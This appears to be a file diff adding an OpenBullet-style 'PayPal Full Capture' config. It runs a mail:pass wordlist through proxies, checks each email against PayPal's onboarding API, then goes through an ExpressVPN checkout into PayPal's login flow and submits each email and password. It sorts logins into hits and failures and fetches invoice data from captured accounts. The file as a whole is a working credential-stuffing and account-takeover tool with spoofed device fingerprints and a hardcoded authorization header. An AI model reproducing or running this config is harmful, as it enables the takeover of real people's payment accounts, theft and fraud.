@@ -1,0 +1,321 @@
+[SETTINGS]
+{
+  "Name": "PayPal Full Capture",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-09-24T12:22:46.3650181+03:30",
+  "AdditionalInfo": "Upadate @ZedSoftOfficial",
+  "Author": "About @ZedSoftOfficial - ZedSoft.ir",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GUID FUNCTION GenerateGUID -> VAR "GUID" 
+
+#GUID1 FUNCTION GenerateGUID -> VAR "GUID1" 
+
+#CHECK REQUEST POST "https://api-m.paypal.com/v1/mfsonboardingserv/user/verification/email" AutoRedirect=FALSE 
+  CONTENT "{\"flowId\":\"Onboarding\",\"riskData\":\"{\\\"location_auth_status\\\":\\\"unknown\\\",\\\"os_type\\\":\\\"iOS\\\",\\\"mg_id\\\":\\\"7b05a80b919a43fd31b6947b1f22182f\\\",\\\"is_emulator\\\":false,\\\"sms_enabled\\\":true,\\\"local_identifier\\\":\\\"<GUID>\\\",\\\"bindSchemeAvailable\\\":\\\"crypto:kmli,biometric:faceid\\\",\\\"device_uptime\\\":77741949,\\\"app_guid\\\":\\\"<GUID1>\\\",\\\"email_configured\\\":true,\\\"linker_id\\\":\\\"<GUID1>\\\",\\\"risk_comp_session_id\\\":\\\"e703f739-d7d4-4c1f-a739-3a026c23f61a\\\",\\\"pin_lock_last_timestamp\\\":<UNX>,\\\"app_version\\\":\\\"8.12.0\\\",\\\"device_name\\\":\\\"Sylas Iphone\\\",\\\"tz_name\\\":\\\"Asia\\\\\\/Kathmandu\\\",\\\"tz\\\":20700000,\\\"ip_addrs\\\":\\\"192.168.1.79\\\",\\\"locale_lang\\\":\\\"en\\\",\\\"is_rooted\\\":false,\\\"total_storage_space\\\":255881465856,\\\"timestamp\\\":1646945865948,\\\"vendor_identifier\\\":\\\"F1B2F632-C01A-4AF1-88D5-B444675DF98A\\\",\\\"TouchIDEnrolled\\\":\\\"false\\\",\\\"magnes_guid\\\":{\\\"id\\\":\\\"575fae73-283e-4c92-98dc-fc7a3bc6bdf8\\\",\\\"created_at\\\":1646945456021},\\\"source_app_version\\\":\\\"8.12.0\\\",\\\"conf_url\\\":\\\"https:\\\\\\/\\\\\\/www.paypalobjects.com\\\\\\/rdaAssets\\\\\\/magnes\\\\\\/magnes_ios_rec_v6.json\\\",\\\"conf_version\\\":\\\"6.0\\\",\\\"ds\\\":false,\\\"TouchIDAvailable\\\":\\\"true\\\",\\\"os_version\\\":\\\"15.3.1\\\",\\\"payload_type\\\":\\\"full\\\",\\\"comp_version\\\":\\\"6.0.3\\\",\\\"pairing_id\\\":\\\"809f4e13d2e5431882fcc4e4fcf905c9\\\",\\\"magnes_source\\\":10,\\\"rf\\\":\\\"00000\\\",\\\"device_model\\\":\\\"iPhone 12 Pro Max\\\",\\\"app_id\\\":\\\"com.yourcompany.PPClient\\\",\\\"PasscodeSet\\\":\\\"true\\\",\\\"dbg\\\":false,\\\"os_type_detail\\\":\\\"iOS\\\",\\\"cloud_identifier\\\":\\\"8f798e1e-6cad-42c6-9a5e-f8a8b5f2aba6\\\",\\\"bindSchemeEnrolled\\\":\\\"none\\\",\\\"conn_type\\\":\\\"wifi\\\",\\\"locale_country\\\":\\\"US\\\",\\\"proxy_setting\\\":\\\"host=192.168.1.89,port=8866,type=kCFProxyTypeHTTPS\\\",\\\"ip_addresses\\\":[\\\"fe80::46c:245f:3448:86a3\\\",\\\"2400:1a00:b111:4274:1451:6ac6:3eeb:357b\\\",\\\"2400:1a00:b111:4274:2820:134f:2369:5b4c\\\",\\\"192.168.1.79\\\",\\\"fe80::54fa:8dff:fe07:2e0\\\",\\\"fe80::965c:9aff:fe1d:387e\\\",\\\"fd74:6572:6d6e:7573:d:efef:50f6:8511\\\",\\\"fd74:6572:6d6e:7573:c:efef:50f6:8511\\\",\\\"fe80::b82f:177:fa88:5846\\\",\\\"fe80::ce81:b1c:bd2c:69f\\\",\\\"fe80::54fa:8dff:fe07:2e0\\\",\\\"fe80::2c12:95ef:9b5e:1d6f\\\",\\\"fe80::e1df:366f:a4fd:e225\\\",\\\"fe80::5ce9:1c9d:a9bf:f571\\\",\\\"fd74:6572:6d6e:7573:c:efef:50f6:8511\\\",\\\"10.254.254.254\\\",\\\"fd74:6572:6d6e:7573:d:efef:50f6:8511\\\"],\\\"t\\\":false,\\\"sr\\\":{\\\"mg\\\":true,\\\"gy\\\":true,\\\"ac\\\":true},\\\"c\\\":25,\\\"dc_id\\\":\\\"2e32345fcac84c1857bc4d4d64eaa50f\\\"}\",\"appInfo\":\"{\\\"device_app_id\\\":\\\"com.yourcompany.PPClient\\\",\\\"client_platform\\\":\\\"Apple\\\",\\\"app_version\\\":\\\"8.12.0\\\",\\\"app_category\\\":3,\\\"app_guid\\\":\\\"37B70F38-00C4-40DA-9790-7BE81FD07F2F\\\",\\\"push_notification_id\\\":\\\"disabled\\\"}\",\"emailId\":\"<USER>\",\"firstPartyClientId\":\"d3aacf450dd6aa992cfba77067560733\",\"deviceInfo\":\"{\\\"device_identifier\\\":\\\"37B70F38-00C4-40DA-9790-7BE81FD07F2F\\\",\\\"device_name\\\":\\\"Sylas Iphone\\\",\\\"device_type\\\":\\\"iOS\\\",\\\"device_key_type\\\":\\\"APPLE_PHONE\\\",\\\"device_model\\\":\\\"iPhone\\\",\\\"device_os\\\":\\\"iOS\\\",\\\"device_os_version\\\":\\\"15.3.1\\\",\\\"is_device_simulator\\\":false,\\\"pp_app_id\\\":\\\"APP-3P637985EF709422H\\\"}\",\"redirectUri\":\"urn:ietf:wg:oauth:2.0:oob\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "host: api-m.paypal.com" 
+  HEADER "content-type: application/json" 
+  HEADER "paypal-client-metadata-id: a68416897d7c4402be925b1a530e557c" 
+  HEADER "accept: application/json" 
+  HEADER "x-paypal-consumerapp-context: %7B%22deviceLocationCountry%22%3A%22NP%22%2C%22deviceLocale%22%3A%22en_US%22%2C%22deviceOSVersion%22%3A%2215.3.1%22%2C%22deviceLanguage%22%3A%22en_US%22%2C%22appGuid%22%3A%2237B70F38-00C4-40DA-9790-7BE81FD07F2F%22%2C%22deviceId%22%3A%22F1B2F632-C01A-4AF1-88D5-B444675DF98A%22%2C%22deviceType%22%3A%22iOS%22%2C%22deviceNetworkCarrier%22%3A%22Carrier%22%2C%22deviceModel%22%3A%22iPhone%22%2C%22appName%22%3A%22com.yourcompany.PPClient%22%2C%22deviceOS%22%3A%22iOS%22%2C%22visitorId%22%3A%2237B70F38-00C4-40DA-9790-7BE81FD07F2F%22%2C%22deviceNetworkType%22%3A%22CTRadioAccessTechnologyLTE%22%2C%22usageTrackerSessionId%22%3A%224D6F57AF-7018-4CF4-919D-D61FA4D27B80%22%2C%22appVersion%22%3A%228.12.0%22%2C%22sdkVersion%22%3A%221.0.0%22%2C%22deviceMake%22%3A%22Apple%22%7D" 
+  HEADER "authorization: Basic QVY4aGRCQk04MHhsZ0tzRC1PYU9ReGVlSFhKbFpsYUN2WFdnVnB2VXFaTVRkVFh5OXBtZkVYdEUxbENxOg==" 
+  HEADER "x-paypal-fpti: {\"user_guid\":\"37B70F38-00C4-40DA-9790-7BE81FD07F2F\",\"user_session_guid\":\"4D6F57AF-7018-4CF4-919D-D61FA4D27B80\"}" 
+  HEADER "accept-language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "content-length: 3135" 
+  HEADER "x-paypal-mobileapp: dmz-access-header" 
+  HEADER "user-agent: PayPal/922 (iPhone; iOS 15.3.1; Scale/3.00)" 
+  HEADER "paypal-request-id: ae304ea73ee348379994255fa3dbb892" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\",\"status\":\"Failure" 
+  KEYCHAIN Ban OR 
+    KEY "RATE_LIMIT_REACHED" 
+  KEYCHAIN Success OR 
+    KEY "This email already exists with PayPal" 
+    KEY "\"status\":\"Success" 
+
+REQUEST GET "https://www.expressvpn.com/order" 
+  
+  HEADER "Host: www.expressvpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://www.expressvpn.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.expressvpn.com/order" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "/><input type=\"hidden\" name=\"authenticity_token\" value=\"" "\"" EncodeOutput=TRUE -> VAR "atk" 
+
+PARSE "<SOURCE>" LR "<meta name=\"csrf-token\" content=\"" "\"" -> VAR "sed" 
+
+REQUEST POST "https://www.expressvpn.com/signup" 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<atk>&signup%5Bpackage_id%5D=3&signup%5Bforter_token%5D=9cf6c1ee178d4300902adf545bfe7100_1662642823423__UDF43-mnf-anf_13ck_tt&signup%5Bbraintree_nonce%5D=&signup%5Bpayment_method%5D=2&signup%5Bemail%5D=sk148sil44%40gmail.com&signup%5Bfirst_name%5D=&signup%5Blast_name%5D=&signup%5Bzip%5D=&signup%5Bcc_number_is_pasted%5D=0&signup%5Bcc_no%5D=&signup%5Bexpiry_month%5D=&signup%5Bexpiry_year%5D=&signup%5Btwo_digit_expiry_year%5D=&signup%5Bccv%5D=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.expressvpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://www.expressvpn.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.expressvpn.com/order" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "wait_for: \"" "\"" EncodeOutput=TRUE -> VAR "wtf" 
+
+FUNCTION CurrentUnixTime -> VAR "cu" 
+
+REQUEST GET "https://www.expressvpn.com/signup/waiting?wait_for=<wtf>&_=<cu>" 
+  
+  HEADER "Host: www.expressvpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"" 
+  HEADER "X-CSRF-Token: <sed>" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "{\"redirect_to\":\"" "\"" -> VAR "ded" 
+
+FUNCTION Unescape "<ded>" -> VAR "TheFlash" 
+
+REQUEST GET "<TheFlash>" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "/><input type=\"hidden\" name=\"requestUrl\" value=\"" "\"" -> VAR "req" 
+
+FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "&amp;" VALUE "&" 
+  "https://www.paypal.com<req>" -> VAR "log" 
+
+PARSE "<SOURCE>" LR "><input type=\"hidden\" id=\"token\" name=\"_csrf\" value=\"" "\"" EncodeOutput=TRUE -> VAR "csrf" 
+
+PARSE "<SOURCE>" LR "input type=\"hidden\" id=\"session\" name=\"_sessionID\" value=\"" "\"" -> VAR "sid" 
+
+PARSE "<SOURCE>" LR "/><input type=\"hidden\" name=\"flowId\" value=\"" "\"" -> VAR "fid" 
+
+PARSE "<SOURCE>" LR "input type=\"hidden\" name=\"state\" value=\"" "\"" -> VAR "st" 
+
+FUNCTION URLEncode "<USER>" -> VAR "U" 
+
+REQUEST POST "<log>" 
+  CONTENT "isSafariAutofill=false&_csrf=<csrf>&_sessionID=<sid>&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%2522BA-5DU56513J5977892N%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_EMAIL%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1662644214421%252C%2522eteid%2522%253A%255B-2047888721%252C-8328042924%252C-5361626211%252C1283869576%252C7021771256%252C-6078336976%252Cnull%252Cnull%255D%252C%2522tts%2522%253A450%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A864%252C%255C%2522width%255C%2522%253A1536%252C%255C%2522availHeight%255C%2522%253A816%252C%255C%2522availWidth%255C%2522%253A1536%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F104.0.0.0%2520Safari%252F537.36%255C%2522%257D%2522%252C%2522d%2522%253A%257B%2522ts1%2522%253A%2522Dk000%253A8352Uk000%253A14Uh%253A1082%2522%252C%2522rDT%2522%253A%252221041%252C20835%252C22627%253A21039%252C20840%252C20500%253A10791%252C10597%252C10252%253A31282%252C31091%252C30746%253A36405%252C36217%252C35868%253A5665%252C5483%252C5130%253A46648%252C46469%252C46113%253A21031%252C20858%252C20499%253A46645%252C46477%252C46115%253A36389%252C36278%252C36843%253A51758%252C51649%252C51242%253A46636%252C46528%252C46108%253A21021%252C20916%252C20498%253A26145%252C26041%252C25622%253A36392%252C36290%252C35876%253A31269%252C31171%252C30744%253A51761%252C51666%252C51247%253A10777%252C10684%252C10259%253A26146%252C26056%252C25621%253A10777%252C10690%252C10261%253A18326%252C35%2522%257D%257D&intent=checkout&ads-client-context=checkout&flowId=<fid>&ads-client-context-data=%7B%22context_id%22%3A%7B%22context_id%22%3A%22<fid>%22%2C%22channel%22%3A0%2C%22flow_type%22%3A%22checkout%22%7D%7D&ctxId=xo_ctx_<fid>&isValidCtxId=true&coBrand=us&signUpEndPoint=%2Fwebapps%2Fmpp%2Faccount-selection&showCountryDropDown=true&isSplitLoginVariant=true&hideOtpLoginCredentials=true&tofOptimizationOtpLoginEnabled=true&requestUrl=<req>&state=<st>&login_email=<U>&captchaCode=&initialSplitLoginContext=inputEmail&isTpdOnboarded=&captcha=&splitLoginContext=inputEmail" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en-US;q=0.9,en;q=0.8" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.paypal.com" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+PARSE "<SOURCE>" LR ",\"otpMayflyKey\":\"" "\"" -> VAR "omg" 
+
+PARSE "<SOURCE>" LR "partyIdHash\":\"" "\"" -> VAR "ph" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "P" 
+
+REQUEST POST "https://www.paypal.com/signin/challenge/sms" 
+  CONTENT "_csrf=<csrf>&_sessionID=<sid>&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%2522BA-5DU56513J5977892N%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_EMAIL%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1662644214421%252C%2522eteid%2522%253A%255B-2047888721%252C-8328042924%252C-5361626211%252C1283869576%252C7021771256%252C-6078336976%252Cnull%252Cnull%255D%252C%2522tts%2522%253A450%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A864%252C%255C%2522width%255C%2522%253A1536%252C%255C%2522availHeight%255C%2522%253A816%252C%255C%2522availWidth%255C%2522%253A1536%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F104.0.0.0%2520Safari%252F537.36%255C%2522%257D%2522%252C%2522d%2522%253A%257B%2522ts1%2522%253A%2522Dk000%253A8352Uk000%253A14Uh%253A1082%2522%252C%2522rDT%2522%253A%252221041%252C20835%252C22627%253A21039%252C20840%252C20500%253A10791%252C10597%252C10252%253A31282%252C31091%252C30746%253A36405%252C36217%252C35868%253A5665%252C5483%252C5130%253A46648%252C46469%252C46113%253A21031%252C20858%252C20499%253A46645%252C46477%252C46115%253A36389%252C36278%252C36843%253A51758%252C51649%252C51242%253A46636%252C46528%252C46108%253A21021%252C20916%252C20498%253A26145%252C26041%252C25622%253A36392%252C36290%252C35876%253A31269%252C31171%252C30744%253A51761%252C51666%252C51247%253A10777%252C10684%252C10259%253A26146%252C26056%252C25621%253A10777%252C10690%252C10261%253A18326%252C35%2522%257D%257D&intent=checkout&ads-client-context=checkout&flowId=<fid>&ads-client-context-data=%7B%22context_id%22%3A%7B%22context_id%22%3A%22<fid>%22%2C%22channel%22%3A0%2C%22flow_type%22%3A%22checkout%22%7D%7D&ctxId=xo_ctx_<fid>&isValidCtxId=true&coBrand=us&signUpEndPoint=%2Fwebapps%2Fmpp%2Faccount-selection&showCountryDropDown=true&isSplitLoginVariant=true&hideOtpLoginCredentials=true&tofOptimizationOtpLoginEnabled=true&requestUrl=<req>&state=<st>&login_email=<USER>&captchaCode=&login_phone=&initialSplitLoginContext=inputEmail&isTpdOnboarded=&login_password=&captcha=&splitLoginContext=inputPassword&otpMayflyKey=<omg>&legalCountry=IN&partyIdHash=<ph>&otpVariant=undefined&otpLoginType=undefined&loginPreference=password_login&otpType=undefined" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en-US;q=0.9,en;q=0.8" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.paypal.com" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+REQUEST POST "https://www.paypal.com/signin?intent=checkout&ctxId=xo_ctx_<fid>&returnUri=/webapps/hermes&state=?flow=1-P&ulReturn=true&token=<fid>&useraction=commit&rcache=1&cookieBannerVariant=hidden&targetService4174=hermesnodeweb&locale.x=en_US&country.x=US&flowId=<fid>" 
+  CONTENT "_csrf=<csrf>&_sessionID=<sid>&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%2522BA-45233646K6101712A%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_PASSWORD%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1662656520061%252C%2522eteid%2522%253A%255B5388993474%252C3580894815%252C5304346661%252C-17990005838%252C-12897943464%252C-2389465160%252Cnull%252Cnull%255D%252C%2522tts%2522%253A1795%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A864%252C%255C%2522width%255C%2522%253A1536%252C%255C%2522availHeight%255C%2522%253A816%252C%255C%2522availWidth%255C%2522%253A1536%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520%28Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F105.0.0.0%2520Safari%252F537.36%255C%2522%257D%2522%252C%2522d%2522%253A%257B%2522ts2%2522%253A%2522Dk17%253A201834Di0%253A643Ui0%253A118Uk17%253A43Uh%253A1986%2522%252C%2522rDT%2522%253A%252216234%252C15925%252C15381%253A26440%252C26150%252C25621%253A26400%252C26125%252C25622%253A36614%252C36352%252C35868%253A5843%252C5594%252C5130%253A41673%252C41439%252C40991%253A21152%252C20930%252C20500%253A10880%252C10671%252C10254%253A36474%252C36275%252C35868%253A15967%252C15778%252C15389%253A15937%252C15767%252C15371%253A36417%252C36256%252C35873%253A5670%252C5516%252C5124%253A15909%252C15759%252C15374%253A15903%252C15757%252C15377%253A5652%252C5509%252C5130%253A36387%252C36246%252C35868%253A41507%252C41367%252C40991%253A26135%252C25998%252C25624%253A51747%252C51611%252C51237%253A18087%252C22%2522%257D%257D&otpMayflyKey=<omg>&intent=checkout&ads-client-context=checkout&flowId=<fid>&ads-client-context-data=%7B%22context_id%22%3A%7B%22context_id%22%3A%22<fid>%22%2C%22channel%22%3A0%2C%22flow_type%22%3A%22checkout%22%7D%7D&ctxId=xo_ctx_<fid>&isValidCtxId=true&coBrand=us&signUpEndPoint=%2Fwebapps%2Fmpp%2Faccount-selection&showCountryDropDown=true&isSplitLoginVariant=true&hideOtpLoginCredentials=true&tofOptimizationOtpLoginEnabled=true&requestUrl=%2Fsignin%3Fintent%3Dcheckout%26ctxId%3Dxo_ctx_<fid>%26returnUri%3D%252Fwebapps%252Fhermes%26state%3D%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526token%253D<fid>%2526useraction%253Dcommit%2526rcache%253D1%2526cookieBannerVariant%253Dhidden%2526targetService4174%253Dhermesnodeweb%26locale.x%3Den_US%26country.x%3DUS%26flowId%3D<fid>&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state=<st>&phoneCode=US+%2B1&login_email=<U>&captchaCode=&initialSplitLoginContext=inputEmail&isTpdOnboarded=&login_password=<P>&captcha=&splitLoginContext=inputPassword&partyIdHash=<ph>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 3322" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.paypal.com" 
+  HEADER "referer: https://www.paypal.com/cgi-bin/webscr?cmd=_express-checkout&token=EC-8MX8605852105022D&useraction=commit" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Some of your info isn't correct. Please try again." 
+    KEY "Some of your info didn't match" 
+    KEY "change the email address, or get help if you forgot your password." 
+    KEY "Try again" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Quick security check" 
+    KEY "For security reasons, you’ll need to reset your password." 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" EqualTo "https://www.paypal.com/webapps/hermes?flow=1-P&country.x=US&locale.x=en_US" 
+
+REQUEST GET "https://www.paypal.com/invoice/s/invoice-model/?template=" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/json" 
+  HEADER "referer: https://www.paypal.com/invoice/s/create" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
